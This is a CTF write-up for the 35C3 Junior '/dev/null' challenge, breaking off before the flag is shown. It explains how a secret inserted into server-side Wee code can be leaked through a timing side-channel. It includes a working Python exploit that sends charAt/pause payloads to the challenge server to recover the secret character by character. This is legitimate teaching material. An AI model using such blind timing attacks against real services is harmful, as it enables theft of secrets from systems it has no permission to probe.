# 35C3 Junior CTF – /dev/null

* **Category:** Misc
* **Points:** 116 (variable)

## Challenge

> We're not the first but definitely the latest to offer dev-null-as-a-service. Pretty sure we're also the first to offer Wee-piped-to-dev-null-as-a-service[WPtDNaaS]. (We don't pipe anything, but the users don't care). This service is more useful than most blockchains (old joke, we know). Anyway this novel endpoint takes input at /wee/dev/null and returns nothing.

> Good coders should learn one new language every year.

> InfoSec folks are even used to learn one new language for every new problem they face (YMMV).

> We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.
>
> Some cool Projects can be created in Wee, like: this, this and that.
>
> Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.
>
> Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).
>
> We even added new features to this better server, like server-side Wee evaluation!
>
> To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods can be discovered.

```Python
def runwee(wee: string) -> string:
    print("{}: running {}".format(request.remote_addr, wee))
    result = check_output(
        ["ts-node", '--cacheDirectory', os.path.join(WEE_PATH, "__cache__"),
         os.path.join(WEE_PATH, WEETERPRETER), wee], shell=False, stderr=STDOUT, timeout=WEE_TIMEOUT,
        cwd=WEE_PATH).decode("utf-8")
    print("{}: result: {}".format(request.remote_addr, result))
    return result

@app.route("/wee/dev/null", methods=["POST"])
def dev_null():
    json = request.get_json(force=True)
    wee = json["code"]
    wee = """
    var DEV_NULL: string = '{}'
    {}
    """.format(DEV_NULL, wee)
    _ = runwee(wee)
    return "GONE"
```

`DEV_NULL` variable contains the flag and is manipulated accessing to `/wee/dev/null` endpoint via POST operation. The variable is put into a *Wee* script, together with an input provided by the user via JSON, that is executed server side.

Unfortunately the execution is completely "blind", because no output is returned to the user, only a constant value (i.e. `GONE`).

Furthermore, the `runwee` method, which executes the passed *Wee* script, contains a timeout (i.e. 5 secs, that you will discover after few analysis).

You have to find a creative way to read that variable. The only way to exfiltrate data is via a *side-channel attack based on timing*, using a check that allows to "guess" the complete string one char at a time, i.e. something like *blind SQL injection* attacks.

Analyzing the documentation you could discover two useful methods:
* `charAt`;
* `pause`.

These could be used to craft a *Wee* script like the following.

```
if charAt(DEV_NULL, position) == '?' then
   pause(4500)
end
```

Where `position` is the char you are trying to guess and `?` is the char candidate. If the char candidate is correct, the script will pause for 4.5 secs.

A Python script can be used to automatize the operation.

```Python
import requests
import time
import json

url = "http://35.207.189.79/wee/dev/null"
data_structure = """{{ "code": {} }}"""
data_content = """if charAt(DEV_NULL, {}) == '{}' then
   pause(4500)
end"""
chars = list("_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
response_time_target = 4.0

try:
   
   f = 0
   flag = ""
   fast_answers = 0
   while fast_answers < len(chars):

      best_char = " "
      best_response_time = 0.0
      fast_answers = 0

      for c in range(len(chars)):
         print "[*] Flag char number '{}', char '{}'.".format(f, chars[c])
         data_content_to_send = json.dumps(data_content.format(f, chars[c]))
         data_to_send = data_structure.format(data_content_to_send)
         print "[*] Payload: '{}'.".format(data_to_send)
         start = time.time()
         response = requests.post(url, data=data_to_send)
         end = time.time()
         print "[*] Response: '{}'.".format(response.text)
      
         response_time = end - start
         print "[*] Response time is '{}'.".format(response_time)
         if response_time >= response_time_target and response_time > best_response_time:
            best_response_time = response_time
            best_char = chars[c]
            print "[*] Found char '{}'.".format(best_char)
            break
         elif response_time < response_time_target:
            fast_answers+=1

      f+=1
      flag += str(best_char)
      print "[*] >>> Flag: '{}'. <<<".format(flag)

except KeyboardInterrupt:
   print "[-] Interrupted!"
```

The flag is the following.

```
